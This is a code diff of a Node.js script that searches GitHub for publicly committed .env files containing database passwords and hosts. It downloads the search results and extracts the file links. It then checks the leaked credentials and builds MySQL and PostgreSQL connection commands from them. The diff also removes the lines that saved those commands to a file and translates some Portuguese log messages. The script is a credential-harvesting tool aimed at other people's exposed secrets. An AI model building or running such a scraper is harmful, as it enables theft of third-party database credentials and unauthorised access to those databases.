@@ -6,7 +6,7 @@ const fs = require('fs');
 const regexTests = require('./regexTests');
 
 //Query que se mete na procura do GitHub
-const query = "path:**/.env db_password= db_host="
+const query = "path:**/.env db_password= db_host=4"
 const encodedQuery = encodeURIComponent(query);
 //Apenas para a primeira página &p=1
 const url = `https://github.com/search?q=${encodedQuery}&type=code&p=1`;
@@ -25,7 +25,7 @@ async function downloadPage() {
         const html = response.data;
 
         fs.writeFileSync('resultspage.html', html, 'utf-8');
-        console.log('Página HTML baixada com sucesso.');
+        console.log('HTML downloaded.');
     } catch (error) {
         console.error('Erro ao baixar a página:', error);
     }
@@ -52,9 +52,9 @@ function findFileUrl() {
         });
 
         fs.writeFileSync('envLinks.txt', Array.from(links).join('\n'), 'utf-8');
-        console.log('Links encontrados e guardados com sucesso.');
+        console.log('Succesfully found links.');
     } catch (error) {
-        console.error('Erro ao processar o arquivo HTML:', error);
+        console.error('Erro:', error);
     }
 }
 
@@ -79,10 +79,7 @@ async function processEnvLinks() {
 
                 if (isValid) {
                     console.log(`Valid Data from ${link}`);
-                    commands = regexTests.buildDbConnectionCommands(validData);
-                    fs.appendFileSync("./commands.txt", `\nFrom ${link}`);
-                    fs.appendFileSync("./commands.txt", `MySQL Command: ${commands.mysqlConnection}\n`);
-                    fs.appendFileSync("./commands.txt", `PostgreSQL Command: ${commands.postgreConnection}\n`);
+                    regexTests.buildDbConnectionCommands(validData);
                     
                 } else {
                     console.log(`Data from ${link} is not valid.`);
